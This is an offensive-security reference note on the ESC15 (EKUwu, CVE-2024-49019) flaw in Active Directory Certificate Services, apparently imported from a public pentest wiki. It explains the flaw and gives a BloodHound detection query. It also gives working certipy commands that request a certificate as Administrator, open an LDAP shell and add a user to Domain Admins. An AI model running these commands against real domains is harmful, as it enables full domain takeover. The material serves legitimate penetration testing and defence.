---
title: Active Directory - Certificate ESC15
type: technique
tags: [active-directory, adcs, certificates, esc15, exploitation, reference-import, windows]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Active Directory - Certificate ESC15

## What it is

This technique now has a CVE number and was patched on November 12, See [Active Directory Certificate Services Elevation of Privilege Vulnerability - CVE-2024-49019](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019) for more information.

## How it works

ESC15 (CVE-2024-49019) exploits schema version 1 certificate templates where `ENROLLEE_SUPPLIES_SUBJECT` is enabled, allowing the requester to inject arbitrary `Application Policies` extensions into the CSR. Because Microsoft treats the proprietary Application Policy extension as overriding the EKU extension in the template, an attacker can include a `Client Authentication` OID in the Application Policy even when the template's own EKU does not include it. This bypasses EKU-based restrictions and converts otherwise non-authenticating templates into vectors for impersonating any domain principal.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## ESC15 - EKUwu Application Policies - CVE-2024-49019

This technique now has a CVE number and was patched on November 12, See [Active Directory Certificate Services Elevation of Privilege Vulnerability - CVE-2024-49019](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019) for more information.

**Requirements**:

* **Template Schema** Version 1
* **ENROLLEE_SUPPLIES_SUBJECT** = `True`

**Exploitation**:

Detect the vulnerability from BloodHound data using the following cypher query.

```ps1
MATCH p=(:Base)-[:MemberOf*0..]->()-[:Enroll|AllExtendedRights]->(ct:CertTemplate)-[:PublishedTo]->(:EnterpriseCA)-[:TrustedForNTAuth]->(:NTAuthStore)-[:NTAuthStoreFor]->(:Domain) WHERE ct.enrolleesuppliessubject = True AND ct.authenticationenabled = False AND ct.requiresmanagerapproval = False AND ct.schemaversion = 1 RETURN p
```

The **Application Policies** extension is a proprietary certificate extension with the OID `1.3.6.1.4.1.311`, same as **x509 EKUs**. It was designed to allow users to specify additional use cases for certificates by utilizing the same OIDs as those in the Enhanced Key Usage extension.
If there is a conflict between an Application Policy and an EKU, then Microsoft prefers the proprietary Application Policy.

> "Application policy is Microsoft specific and is treated much like Extended Key Usage. If a certificate has an extension containing an application policy and also has an EKU extension, the EKU extension is ignored." - Microsoft

When a user requests a certificate based on a schema version 1 template and includes an application policy, the policy is incorporated into the certificate. This allows users to specify arbitrary EKUs, bypassing the requirements for ESC2.

**ESC1** - The WebServer template is enabled by default in ADCS, requires a user-supplied SAN and only has the `Server Authentication` EKU. Using [ly4k/Certipy PR #228](https://github.com/ly4k/Certipy/pull/228), we can add the `Client Authentication` EKU to `WebServer`. Anybody with the `Enroll` permission on this template can now compromise the domain.

```ps1
certipy req -dc-ip 10.10.10.10 -ca CA -target-ip 10.10.10.11 -u user@domain.com -p 'P@ssw0rd' -template WebServer -upn Administrator@domain.com --application-policies 'Client Authentication'
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell

# in LDAP shell
add_user pentest_user
add_user_to_group pentest_user "Domain Admins"
```

**ESC2/ESC3** - **Certificate Request Agent** (`1.3.6.1.4.1.311.20.2.1`),

```ps1
certipy -req -u user@domain.com -p 'P@ssw0rd' --application-policies "1.3.6.1.4.1.311.20.2.1" -ca "Lab Root CA" -template WebServer -dc-ip 10.10.10.10 -target-ip 10.10.10.11
certipy -req -u user@domain.com -p 'P@ssw0rd' -on-behalf-of DOMAIN\\Administrator -Template User -ca "Lab Root CA" -pfx user.pfx -dc-ip 10.10.10.10 -target-ip 10.10.10.11
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

## References

* [AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps - frank - July 23, 2021](https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/)
* [ADCS Exploitation Part 2: Certificate Mapping + ESC15 - Giulio Pierantoni - October 10, 2024](https://medium.com/@offsecdeer/adcs-exploitation-series-part-2-certificate-mapping-esc15-6e19a6037760)
* [Curious case of AD CS ESC15 vulnerable instance and its manual exploitation - Mannu Linux - February 13, 2025](https://www.mannulinux.org/2025/02/Curious-case-of-AD-CS-ESC15-vulnerable-instance-and-its-manual-exploitation.html)
* [EKUwu: Not just another AD CS ESC - Justin Bollinger - October 08, 2024](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
* [ESC15/EKUwu PR #228 - dru1d-foofus - August 10, 2024](https://github.com/ly4k/Certipy/pull/228)
* [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- [[bloodhound]]
- [[certipy]]
- [[impacket]]

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
